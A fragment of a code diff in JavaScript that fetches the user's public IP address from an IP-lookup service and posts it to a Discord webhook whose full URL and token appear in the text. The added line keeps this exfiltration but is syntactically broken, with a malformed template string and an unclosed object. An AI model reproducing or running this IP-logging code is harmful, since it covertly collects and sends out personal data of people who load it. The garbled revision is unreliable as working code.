@@ -11,4 +11,4 @@ a.open("GET","https://api64.ipify.org");
 
 a.send();
         
-rqwbm("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",JSON.stringify({"content":`IP: `+a.responseText}));
+rqwbm("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",JSON.stringify({"content":`IP: {a.response}`));
